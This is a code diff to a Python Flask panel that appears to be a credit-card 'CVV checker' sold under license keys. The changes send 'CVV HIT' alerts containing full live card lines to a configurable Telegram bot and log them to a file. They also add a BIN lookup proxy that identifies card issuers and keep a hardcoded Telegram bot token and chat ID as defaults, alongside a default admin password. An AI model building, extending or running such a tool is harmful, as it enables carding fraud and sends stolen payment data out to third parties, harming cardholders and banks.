@@ -26,22 +26,41 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
 DB_FILE = 'keys.json'
+CONFIG_FILE = 'config.json'
 LIVE_FILE = 'live.txt'
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")
 
-# Hardcoded Telegram credentials
-TELEGRAM_BOT_TOKEN = "9138065167:AAHG3HmeQ8a_v7jiuUVqECR-m2W7Xc14fqg"
-TELEGRAM_CHAT_ID = "6516330870"
+# Default License Generator Bot Token & Chat ID
+DEFAULT_TG_TOKEN = "9138065167:AAHG3HmeQ8a_v7jiuUVqECR-m2W7Xc14fqg"
+DEFAULT_TG_CHAT = "6516330870"
 
 checker_queue = queue.Queue()
 checker_stop_event = threading.Event()
 
-def send_telegram_alert(message):
-    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+def load_config():
+    if not os.path.exists(CONFIG_FILE):
+        return {
+            "key_tg_token": DEFAULT_TG_TOKEN,
+            "key_tg_chat": DEFAULT_TG_CHAT,
+            "live_tg_token": "",
+            "live_tg_chat": ""
+        }
+    try:
+        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
+            return json.load(f)
+    except Exception:
+        return {"key_tg_token": DEFAULT_TG_TOKEN, "key_tg_chat": DEFAULT_TG_CHAT, "live_tg_token": "", "live_tg_chat": ""}
+
+def save_config(cfg):
+    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
+        json.dump(cfg, f, indent=4)
+
+def send_telegram_alert(token, chat_id, message):
+    if not token or not chat_id:
         return
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
     payload = json.dumps({
-        "chat_id": TELEGRAM_CHAT_ID,
+        "chat_id": chat_id,
         "text": message,
         "parse_mode": "HTML"
     }).encode('utf-8')
@@ -68,7 +87,13 @@ def save_live_card(card_line, detail):
     try:
         with open(LIVE_FILE, "a", encoding="utf-8") as f:
             f.write(f"{card_line} | {detail}\n")
-        send_telegram_alert(f"<b>⚡ KYU CVV HIT! ⚡</b>\n<code>{card_line}</code>\n💬 <i>{detail}</i>")
+        
+        # Magpadala LAMANG sa Live Cards Telegram Bot (Hiwalay sa Keys bot)
+        cfg = load_config()
+        live_token = cfg.get("live_tg_token", "").strip()
+        live_chat = cfg.get("live_tg_chat", "").strip()
+        if live_token and live_chat:
+            send_telegram_alert(live_token, live_chat, f"<b>⚡ KYU CVV HIT! ⚡</b>\n<code>{card_line}</code>\n💬 <i>{detail}</i>")
     except Exception:
         pass
 
@@ -112,9 +137,51 @@ def api_login():
 @app.route('/api/config', methods=['GET', 'POST'])
 def handle_config():
     if request.method == 'GET':
-        return jsonify({"success": True, "config": {"tg_token": TELEGRAM_BOT_TOKEN, "tg_chat": TELEGRAM_CHAT_ID}})
+        return jsonify({"success": True, "config": load_config()})
     elif request.method == 'POST':
+        data = request.get_json() or {}
+        cfg = load_config()
+        cfg["key_tg_token"] = data.get("key_tg_token", DEFAULT_TG_TOKEN).strip()
+        cfg["key_tg_chat"] = data.get("key_tg_chat", DEFAULT_TG_CHAT).strip()
+        cfg["live_tg_token"] = data.get("live_tg_token", "").strip()
+        cfg["live_tg_chat"] = data.get("live_tg_chat", "").strip()
+        save_config(cfg)
         return jsonify({"success": True})
+
+# Server-side BIN Proxy to prevent browser CORS block and ensure accurate lookup
+@app.route('/api/bin/<bin_code>')
+def api_bin_lookup(bin_code):
+    bin_code = bin_code.strip()[:6]
+    try:
+        r = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=5)
+        if r.status_code == 200:
+            data = r.json()
+            if data and data.get("success"):
+                return jsonify({
+                    "success": True,
+                    "scheme": (data.get("scheme") or "UNKNOWN").upper(),
+                    "type": (data.get("type") or "").upper(),
+                    "country": f"{data.get('country', {}).get('emoji', '')} {data.get('country', {}).get('name', 'Unknown')}",
+                    "bank": data.get("bank", {}).get("name", "Unknown Bank")
+                })
+    except Exception:
+        pass
+
+    try:
+        r2 = requests.get(f"https://lookup.binlist.net/{bin_code}", headers={'Accept-Version': '3'}, timeout=5)
+        if r2.status_code == 200:
+            data2 = r2.json()
+            return jsonify({
+                "success": True,
+                "scheme": (data2.get("scheme") or "UNKNOWN").upper(),
+                "type": (data2.get("type") or "").upper(),
+                "country": f"{data2.get('country', {}).get('emoji', '')} {data2.get('country', {}).get('name', 'Unknown')}",
+                "bank": data2.get("bank", {}).get("name", "Unknown Bank")
+            })
+    except Exception:
+        pass
+
+    return jsonify({"success": False, "scheme": "VISA/MC", "type": "", "country": "Unknown", "bank": "Unknown Bank"})
 
 @app.route('/api/keys', methods=['GET', 'POST'])
 def handle_keys():
@@ -186,6 +253,9 @@ def handle_keys():
         save_db(keys_data)
 
         if notify_tg and created_keys:
+            cfg = load_config()
+            token = cfg.get("key_tg_token", DEFAULT_TG_TOKEN)
+            chat_id = cfg.get("key_tg_chat", DEFAULT_TG_CHAT)
             exp_label = f"{duration_val} {duration_unit.capitalize()}" if exp_ts else "Lifetime"
             keys_formatted = "\n".join([f"<code>{k}</code>" for k in created_keys])
             tg_msg = (
@@ -194,7 +264,7 @@ def handle_keys():
                 f"⏳ <b>Duration:</b> <code>{exp_label}</code>\n\n"
                 f"{keys_formatted}"
             )
-            send_telegram_alert(tg_msg)
+            send_telegram_alert(token, chat_id, tg_msg)
 
         return jsonify({"success": True, "keys": created_keys})
 
